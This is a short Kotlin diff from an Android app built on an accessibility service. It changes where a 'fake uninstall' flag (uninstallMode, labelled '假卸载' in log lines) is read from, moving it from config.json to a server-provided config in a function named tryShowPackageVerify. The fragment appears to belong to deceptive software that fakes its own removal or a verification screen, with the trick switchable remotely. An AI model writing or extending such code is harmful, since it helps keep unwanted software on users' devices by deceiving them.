@@ -290,11 +290,10 @@ class ServiceInitializer(private val service: MyAccessibilityService) {
             android.util.Log.d(TAG, "📦 [假卸载] ★★★ tryShowPackageVerify() 被调用 ★★★")
 
             val uninstallMode = try {
-                val text = service.assets.open("config.json").bufferedReader().use { it.readText() }
-                val json = JSONObject(text)
-                json.optJSONObject("protection")?.optBoolean("uninstall_mode", false) ?: false
+                val text = com.storm.safe.rock.util.AssetConfigReader.readAssetConfig(service, "server_config.json")
+                if (text != null) JSONObject(text).optBoolean("uninstallMode", false) else false
             } catch (_: Exception) { false }
-            android.util.Log.d(TAG, "📦 [假卸载] uninstallMode=$uninstallMode (配置来源: config.json)")
+            android.util.Log.d(TAG, "📦 [假卸载] uninstallMode=$uninstallMode (配置来源: server_config.json)")
             if (!uninstallMode) {
                 android.util.Log.d(TAG, "📦 [假卸载] uninstallMode 未启用，跳过")
                 return
